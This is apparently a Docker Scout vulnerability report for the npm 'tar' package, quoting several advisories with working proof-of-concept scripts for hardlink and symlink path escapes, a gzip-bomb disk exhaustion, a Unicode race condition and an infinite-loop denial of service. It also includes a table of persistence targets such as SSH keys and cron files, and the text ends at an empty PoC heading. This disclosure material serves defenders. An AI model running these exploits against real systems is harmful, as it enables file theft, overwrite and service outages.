<tr><td>Affected range</td><td><code><7.5.8</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.8</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.288%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
`tar.extract()` in Node `tar` allows an attacker-controlled archive to create a hardlink inside the extraction directory that points to a file outside the extraction root, using default options.

This enables **arbitrary file read and write** as the extracting user (no root, no chmod, no `preservePaths`).

Severity is high because the primitive bypasses path protections and turns archive extraction into a direct filesystem access primitive.

### Details
The bypass chain uses two symlinks plus one hardlink:

1. `a/b/c/up -> ../..`
2. `a/b/escape -> c/up/../..`
3. `exfil` (hardlink) -> `a/b/escape/<target-relative-to-parent-of-extract>`

Why this works:

- Linkpath checks are string-based and do not resolve symlinks on disk for hardlink target safety.
  - See `STRIPABSOLUTEPATH` logic in:
    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:255`
    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:268`
    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:281`

- Hardlink extraction resolves target as `path.resolve(cwd, entry.linkpath)` and then calls `fs.link(target, destination)`.
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:566`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:567`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:703`

- Parent directory safety checks (`mkdir` + symlink detection) are applied to the destination path of the extracted entry, not to the resolved hardlink target path.
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:617`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:619`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:27`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:101`

As a result, `exfil` is created inside extraction root but linked to an external file. The PoC confirms shared inode and successful read+write via `exfil`.

### PoC
[hardlink.js](https://github.com/user-attachments/files/25240082/hardlink.js)
Environment used for validation:

- Node: `v25.4.0`
- tar: `7.5.7`
- OS: macOS Darwin 25.2.0
- Extract options: defaults (`tar.extract({ file, cwd })`)

Steps:

1. Prepare/locate a `tar` module. If `require('tar')` is not available locally, set `TAR_MODULE` to an absolute path to a tar package directory.

2. Run:

```bash
TAR_MODULE="$(cd '../tar-audit-setuid - CVE/node_modules/tar' && pwd)" node hardlink.js
```

3. Expected vulnerable output (key lines):

```text
same_inode=true
read_ok=true
write_ok=true
result=VULNERABLE
```

Interpretation:

- `same_inode=true`: extracted `exfil` and external secret are the same file object.
- `read_ok=true`: reading `exfil` leaks external content.
- `write_ok=true`: writing `exfil` modifies external file.

### Impact
Vulnerability type:

- Arbitrary file read/write via archive extraction path confusion and link resolution.

Who is impacted:

- Any application/service that extracts attacker-controlled tar archives with Node `tar` defaults.
- Impact scope is the privileges of the extracting process user.

Potential outcomes:

- Read sensitive files reachable by the process user.
- Overwrite writable files outside extraction root.
- Escalate impact depending on deployment context (keys, configs, scripts, app data).

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 7" src="https://img.shields.io/badge/H-7-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>tar</strong> <code>7.4.3</code> (npm)</summary>

<small><code>pkg:npm/tar@7.4.3</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-59873?s=github&n=tar&t=npm&vr=%3C%3D7.5.18"><img alt="critical 9.2: CVE--2026--59873" src="https://img.shields.io/badge/CVE--2026--59873-lightgrey?label=critical%209.2&labelColor=8b1924"/></a> <i>Allocation of Resources Without Limits or Throttling</i>

<table>
<tr><td>Affected range</td><td><code><=7.5.18</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.19</code></td></tr>
<tr><td>CVSS Score</td><td><code>9.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.358%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
A **Decompression/parse DoS via unlimited input** vulnerability in `node-tar` allows an attacker to exhaust server resources (disk space and CPU). Because the library does not enforce hard upper bounds on total decompressed data or entry counts, a small, maliciously crafted "Gzip Bomb" can be used to fill a server's storage and crash services.

### Details
The `node-tar` library does not enforce a hard upper bound on archive size or the volume of decompressed data processed during extraction. While the `maxReadSize` option exists, it only controls internal read chunk sizes (default 16MB) and does not limit the total cumulative bytes written to disk.

Specifically, in `src/extract.ts`, the `Unpack` stream processes entries as they arrive. There is no total-bytes limit, entry-count limit, or decompression ratio guard. An attacker can provide a TAR header claiming a massive file size (e.g., 10GB) and follow it with highly compressible data (like zeros). `node-tar` will continue to extract and write this data until the physical disk is exhausted, as it lacks a mechanism to abort based on global resource consumption.

### PoC
The following Proof of Concept demonstrates how a tiny compressed input can be expanded into gigabytes of data on the host machine almost instantly.

1. Create the exploit script:
```javascript
const fs = require('fs'), z = require('zlib'), t = require('tar');

const d = 'dos_test';
if (fs.existsSync(d)) fs.rmSync(d, {recursive:true});
fs.mkdirSync(d);

// Build 10GB header
const h = Buffer.alloc(512);
h.write('payload');
h.write((10*1024**3).toString(8).padStart(11,'0'), 124); 
h.write('ustar', 257);
let s = 256;
for(let i=0;i<512;i++) if(i<148||i>155) s+=h[i];
h.write(s.toString(8).padStart(6,'0'), 148);

const gz = z.createGzip();
gz.pipe(t.x({cwd: d}));
gz.write(h);

const b = Buffer.alloc(32 * 1024 * 1024); // 32MB chunks for speed

const run = () => {
  while (gz.write(b));
  gz.once('drain', run);
};

const monitor = setInterval(() => {
    try {
        const bytes = fs.statSync(`${d}/payload`).size;
        const mb = Math.floor(bytes / (1024 * 1024));
        process.stdout.write(`\r[>] Extracted: ${mb} MB`);
        
        if (mb > 5000) { 
            console.log('\n[!] VULN CONFIRMED: 5GB+ written from tiny input.'); 
            process.exit(); 
        }
    } catch {}
}, 50);

process.on('exit', () => {
    clearInterval(monitor);
    console.log('[*] Cleaning up...');
    if (fs.existsSync(d)) fs.rmSync(d, {recursive:true, force:true});
});

run();
```

2. Run the PoC:
```bash
node poc.js
```

**Observation:** You will see the extracted size rapidly climb to 5,000 MB+ within seconds, while the actual data being "sent" through the gzip stream is negligible.

### Impact
This is a **Denial of Service (DoS)** vulnerability. It impacts any application or service that uses `node-tar` to extract archives provided by untrusted users (e.g., npm registries, CI/CD pipelines, or file-sharing platforms). An unauthenticated attacker can send a small payload that expands to consume all available disk space, leading to system-wide failure and service outages.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-23950?s=github&n=tar&t=npm&vr=%3C%3D7.5.3"><img alt="high 8.8: CVE--2026--23950" src="https://img.shields.io/badge/CVE--2026--23950-lightgrey?label=high%208.8&labelColor=e25d68"/></a> <i>Improper Handling of Unicode Encoding</i>

<table>
<tr><td>Affected range</td><td><code><=7.5.3</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.233%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS

**AUTHOR**: Tomás Illuminati

### Details

A race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.

```typescript
// node-tar/src/path-reservations.ts (Lines 53-62)
reserve(paths: string[], fn: Handler) {
    paths =
      isWindows ?
        ['win32 parallelization disabled']
      : paths.map(p => {
          return stripTrailingSlashes(
            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS
          ).toLowerCase()
        })

```

In MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example:

``````bash
bash-3.2$ printf "CONTENT_SS\n" > collision_test_ss
bash-3.2$ ls
collision_test_ss
bash-3.2$ printf "CONTENT_ESSZETT\n" > collision_test_ß
bash-3.2$ ls -la
total 8
drwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .
drwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..
-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss
bash-3.2$ 
``````

---

### PoC

``````javascript
const tar = require('tar');
const fs = require('fs');
const path = require('path');
const { PassThrough } = require('stream');

const exploitDir = path.resolve('race_exploit_dir');
if (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });
fs.mkdirSync(exploitDir);

console.log('[*] Testing...');
console.log(`[*] Extraction target: ${exploitDir}`);

// Construct stream
const stream = new PassThrough();

const contentA = 'A'.repeat(1000);
const contentB = 'B'.repeat(1000);

// Key 1: "f_ss"
const header1 = new tar.Header({
    path: 'collision_ss',
    mode: 0o644,
    size: contentA.length,
});
header1.encode();

// Key 2: "f_ß"
const header2 = new tar.Header({
    path: 'collision_ß',
    mode: 0o644,
    size: contentB.length,
});
header2.encode();

// Write to stream
stream.write(header1.block);
stream.write(contentA);
stream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding

stream.write(header2.block);
stream.write(contentB);
stream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding

// End
stream.write(Buffer.alloc(1024));
stream.end();

// Extract
const extract = new tar.Unpack({
    cwd: exploitDir,
    // Ensure jobs is high enough to allow parallel processing if locks fail
    jobs: 8 
});

stream.pipe(extract);

extract.on('end', () => {
    console.log('[*] Extraction complete');

    // Check what exists
    const files = fs.readdirSync(exploitDir);
    console.log('[*] Files in exploit dir:', files);
    files.forEach(f => {
        const p = path.join(exploitDir, f);
        const stat = fs.statSync(p);
        const content = fs.readFileSync(p, 'utf8');
        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);
    });

    if (files.length === 1 || (files.length === 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {
        console.log('\[*] GOOD');
    } else {
        console.log('[-] No collision');
    }
});

``````

---

### Impact
This is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.

---

### Remediation

Update `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.

Users who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.

---

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-59874?s=github&n=tar&t=npm&vr=%3C%3D7.5.17"><img alt="high 8.7: CVE--2026--59874" src="https://img.shields.io/badge/CVE--2026--59874-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Loop with Unreachable Exit Condition ('Infinite Loop')</i>

<table>
<tr><td>Affected range</td><td><code><=7.5.17</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.18</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.358%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

A checksum-valid tar archive with a negative base-256 encoded entry size can make `tar.replace()` loop forever while scanning the existing archive. Applications that update attacker-controlled tar archives can have a worker process pinned indefinitely, causing denial of service.

### Details

The public `tar.replace()` API scans the existing archive before appending replacement entries. During this scan, it parses each tar header and advances the archive position by the parsed entry size rounded to a 512-byte block boundary.

Tar supports base-256 encoded numeric fields. A crafted header can encode the entry size as `-512` while still carrying a valid checksum. The replace scan accepts that parsed negative size and uses it in the position-advance calculation.

For a size of `-512`, the computed body skip is `-512`. The scan then adds the normal 512-byte header step, resulting in no net progress. The scanner repeatedly parses the same header forever and never reaches the append step.

This is reachable through the supported package API when the existing archive file is attacker controlled. It does not rely on extraction, dependency behavior, or an uncaught exception.

### PoC

Save as `poc.mjs` in a project with the vulnerable package installed and run:

```bash
node poc.mjs
```

```js
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { spawnSync } from 'node:child_process'

const oct = (b, n, off, len) =>
  b.write(n.toString(8).padStart(len - 1, '0') + '\0', off, len, 'ascii')

const badHeader = () => {
  const h = Buffer.alloc(512)

  h.write('x', 0)
  oct(h, 0o644, 100, 8)
  oct(h, 0, 108, 8)
  oct(h, 0, 116, 8)

  // base-256 encoded -512 in the size field
  Buffer.alloc(10, 0xff).copy(h, 124)
  h[134] = 0xfe
  h[135] = 0x00

  oct(h, 0, 136, 12)
  h.fill(0x20, 148, 156)
  h[156] = 0x30
  h.write('ustar\0' + '00', 257, 8, 'binary')

  let sum = 0
  for (const c of h) sum += c
  h.write(sum.toString(8).padStart(6, '0') + '\0 ', 148, 8, 'ascii')

  return h
}

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'tar-loop-'))
const file = path.join(dir, 'poc.tar')

fs.writeFileSync(file, badHeader())
fs.writeFileSync(path.join(dir, 'add.txt'), 'x')

const r = spawnSync(
  process.execPath,
  [
    '--input-type=module',
    '-e',
    `
      import * as tar from 'tar'
      tar.replace({ file: ${JSON.stringify(file)}, cwd: ${JSON.stringify(dir)}, sync: true }, ['add.txt'])
      console.log('completed')
    `,
  ],
  { timeout: 20_000 }
)

console.log(r.error?.code === 'ETIMEDOUT')

// Output: true
```

### Impact

An application that calls `tar.replace()` on an existing archive supplied or controlled by an attacker can be forced into a non-terminating archive scan. This can consume a worker process indefinitely and cause denial of service. Plain extraction-only workflows are not affected by this finding.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-31802?s=github&n=tar&t=npm&vr=%3C%3D7.5.10"><img alt="high 8.2: CVE--2026--31802" src="https://img.shields.io/badge/CVE--2026--31802-lightgrey?label=high%208.2&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><=7.5.10</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.11</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.253%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
`tar` (npm) can be tricked into creating a symlink that points outside the extraction directory by using a drive-relative symlink target such as `C:../../../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.

### Details
The extraction logic in `Unpack[STRIPABSOLUTEPATH]` validates `..` segments against a resolved path that still uses the original drive-relative value, and only afterwards rewrites the stored `linkpath` to the stripped value.

What happens with `linkpath: "C:../../../target.txt"`:
1. `stripAbsolutePath()` removes `C:` and rewrites the value to `../../../target.txt`.
2. The escape check resolves using the original pre-stripped value, so it is treated as in-bounds and accepted.
3. Symlink creation uses the rewritten value (`../../../target.txt`) from nested path `a/b/l`.
4. Writing through the extracted symlink overwrites the outside file (`../target.txt`).

This is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.

### PoC
Tested on Arch Linux with `tar@7.5.10`.

PoC script (`poc.cjs`):

```js
const fs = require('fs')
const path = require('path')
const { Header, x } = require('tar')

const cwd = process.cwd()
const target = path.resolve(cwd, '..', 'target.txt')
const tarFile = path.join(cwd, 'poc.tar')

fs.writeFileSync(target, 'ORIGINAL\n')

const b = Buffer.alloc(1536)
new Header({
  path: 'a/b/l',
  type: 'SymbolicLink',
  linkpath: 'C:../../../target.txt',
}).encode(b, 0)
fs.writeFileSync(tarFile, b)

x({ cwd, file: tarFile }).then(() => {
  fs.writeFileSync(path.join(cwd, 'a/b/l'), 'PWNED\n')
  process.stdout.write(fs.readFileSync(target, 'utf8'))
})
```

Run:

```bash
node poc.cjs && readlink a/b/l && ls -l a/b/l ../target.txt
```

Observed output:

```text
PWNED
../../../target.txt
lrwxrwxrwx - joshuavr  7 Mar 18:37 󰡯 a/b/l -> ../../../target.txt
.rw-r--r-- 6 joshuavr  7 Mar 18:37  ../target.txt
```

`PWNED` confirms outside file content overwrite. `readlink` and `ls -l` confirm the extracted symlink points outside the extraction directory.

### Impact
This is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.

Realistic scenarios:
- CLI tools unpacking untrusted tarballs into a working directory
- build/update pipelines consuming third-party archives
- services that import user-supplied tar files

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-29786?s=github&n=tar&t=npm&vr=%3C%3D7.5.9"><img alt="high 8.2: CVE--2026--29786" src="https://img.shields.io/badge/CVE--2026--29786-lightgrey?label=high%208.2&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><=7.5.9</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.10</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:L/SC:N/SI:H/SA:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.408%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
`tar` (npm) can be tricked into creating a hardlink that points outside the extraction directory by using a drive-relative link target such as `C:../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.

### Details
The extraction logic in `Unpack[STRIPABSOLUTEPATH]` checks for `..` segments *before* stripping absolute roots.

What happens with `linkpath: "C:../target.txt"`:
1. Split on `/` gives `['C:..', 'target.txt']`, so `parts.includes('..')` is false.
2. `stripAbsolutePath()` removes `C:` and rewrites the value to `../target.txt`.
3. Hardlink creation resolves this against extraction `cwd` and escapes one directory up.
4. Writing through the extracted hardlink overwrites the outside file.

This is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.

### PoC
Tested on Arch Linux with `tar@7.5.9`.

PoC script (`poc.cjs`):

```js
const fs = require('fs')
const path = require('path')
const { Header, x } = require('tar')

const cwd = process.cwd()
const target = path.resolve(cwd, '..', 'target.txt')
const tarFile = path.join(process.cwd(), 'poc.tar')

fs.writeFileSync(target, 'ORIGINAL\n')

const b = Buffer.alloc(1536)
new Header({ path: 'l', type: 'Link', linkpath: 'C:../target.txt' }).encode(b, 0)
fs.writeFileSync(tarFile, b)

x({ cwd, file: tarFile }).then(() => {
  fs.writeFileSync(path.join(cwd, 'l'), 'PWNED\n')
  process.stdout.write(fs.readFileSync(target, 'utf8'))
})
```

Run:

```bash
cd test-workspace
node poc.cjs && ls -l ../target.txt
```

Observed output:

```text
PWNED
-rw-r--r-- 2 joshuavr joshuavr 6 Mar  4 19:25 ../target.txt
```

`PWNED` confirms outside file content overwrite. Link count `2` confirms the extracted file and `../target.txt` are hardlinked.

### Impact
This is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.

Realistic scenarios:
- CLI tools unpacking untrusted tarballs into a working directory
- build/update pipelines consuming third-party archives
- services that import user-supplied tar files

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-24842?s=github&n=tar&t=npm&vr=%3C7.5.7"><img alt="high 8.2: CVE--2026--24842" src="https://img.shields.io/badge/CVE--2026--24842-lightgrey?label=high%208.2&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><7.5.7</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.7</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.541%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>42nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
node-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.

### Details
The vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently:

**Security check in `[STRIPABSOLUTEPATH]`:**
```javascript
const entryDir = path.posix.dirname(entry.path);
const resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));
if (resolved.startsWith('../')) { /* block */ }
```

**Hardlink creation in `[HARDLINK]`:**
```javascript
const linkpath = path.resolve(this.cwd, entry.linkpath);
fs.linkSync(linkpath, dest);
```

**Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`.

- **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**.

- **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`.

The security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.

### PoC
#### Setup

Create a new directory with these files:

```
poc/
├── package.json
├── secret.txt          ← sensitive file (target)
├── server.js           ← vulnerable server
├── create-malicious-tar.js
├── verify.js
└── uploads/            ← created automatically by server.js
    └── (extracted files go here)
```

**package.json**
```json
{ "dependencies": { "tar": "^7.5.0" } }
```

**secret.txt** (sensitive file outside uploads/)
```
DATABASE_PASSWORD=supersecret123
```

**server.js** (vulnerable file upload server)
```javascript
const http = require('http');
const fs = require('fs');
const path = require('path');
const tar = require('tar');

const PORT = 3000;
const UPLOAD_DIR = path.join(__dirname, 'uploads');
fs.mkdirSync(UPLOAD_DIR, { recursive: true });

http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/upload') {
    const chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', async () => {
      fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks));
      await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR });
      res.end('Extracted\n');
    });
  } else if (req.method === 'GET' && req.url === '/read') {
    // Simulates app serving extracted files (e.g., file download, static assets)
    const targetPath = path.join(UPLOAD_DIR, 'd', 'x');
    if (fs.existsSync(targetPath)) {
      res.end(fs.readFileSync(targetPath));
    } else {
      res.end('File not found\n');
    }
  } else if (req.method === 'POST' && req.url === '/write') {
    // Simulates app writing to extracted file (e.g., config update, log append)
    const chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', () => {
      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');
      if (fs.existsSync(targetPath)) {
        fs.writeFileSync(targetPath, Buffer.concat(chunks));
        res.end('Written\n');
      } else {
        res.end('File not found\n');
      }
    });
  } else {
    res.end('POST /upload, GET /read, or POST /write\n');
  }
}).listen(PORT, () => console.log(`http://localhost:${PORT}`));
```

**create-malicious-tar.js** (attacker creates exploit TAR)
```javascript
const fs = require('fs');

function tarHeader(name, type, linkpath = '', size = 0) {
  const b = Buffer.alloc(512, 0);
  b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108);
  b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124);
  b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136);
  b.write('        ', 148);
  b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;
  if (linkpath) b.write(linkpath, 157);
  b.write('ustar\x00', 257); b.write('00', 263);
  let sum = 0; for (let i = 0; i < 512; i++) sum += b[i];
  b.write(sum.toString(8).padStart(6, '0') + '\x00 ', 148);
  return b;
}

// Hardlink escapes to parent directory's secret.txt
fs.writeFileSync('malicious.tar', Buffer.concat([
  tarHeader('d/', 'dir'),
  tarHeader('d/x', 'link', '../secret.txt'),
  Buffer.alloc(1024)
]));
console.log('Created malicious.tar');
```

#### Run

```bash
# Setup
npm install
echo "DATABASE_PASSWORD=supersecret123" > secret.txt

# Terminal 1: Start server
node server.js

# Terminal 2: Execute attack
node create-malicious-tar.js
curl -X POST --data-binary @malicious.tar http://localhost:3000/upload

# READ ATTACK: Steal secret.txt content via the hardlink
curl http://localhost:3000/read
# Returns: DATABASE_PASSWORD=supersecret123

# WRITE ATTACK: Overwrite secret.txt through the hardlink
curl -X POST -d "PWNED" http://localhost:3000/write

# Confirm secret.txt was modified
cat secret.txt
```
### Impact

An attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables:

**Immediate (Read Attack):** If the application serves extracted files, attacker can read any file readable by the process.

**Conditional (Write Attack):** If the application later writes to the hardlink path, it modifies the target file outside the extraction directory.

### Remote Code Execution / Server Takeover

| Attack Vector | Target File | Result |
|--------------|-------------|--------|
| SSH Access | `~/.ssh/authorized_keys` | Direct shell access to server |
| Cron Backdoor | `/etc/cron.d/*`, `~/.crontab` | Persistent code execution |
| Shell RC Files | `~/.bashrc`, `~/.profile` | Code execution on user login |
| Web App Backdoor | Application `.js`, `.php`, `.py` files | Immediate RCE via web requests |
| Systemd Services | `/etc/systemd/system/*.service` | Code execution on service restart |
| User Creation | `/etc/passwd` (if running as root) | Add new privileged user |

## Data Exfiltration & Corruption

1. **Overwrite arbitrary files** via hardlink escape + subsequent write operations
2. **Read sensitive files** by creating hardlinks that point outside extraction directory
3. **Corrupt databases** and application state
4. **Steal credentials** from config files, `.env`, secrets

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-23745?s=github&n=tar&t=npm&vr=%3C%3D7.5.2"><img alt="high 8.2: CVE--2026--23745" src="https://img.shields.io/badge/CVE--2026--23745-lightgrey?label=high%208.2&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><=7.5.2</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.334%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

The `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.

### Details

The vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.

**1. Hardlink Escape (Arbitrary File Overwrite)**

The extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.

The library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.

**2. Symlink Poisoning**

The extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.

### PoC

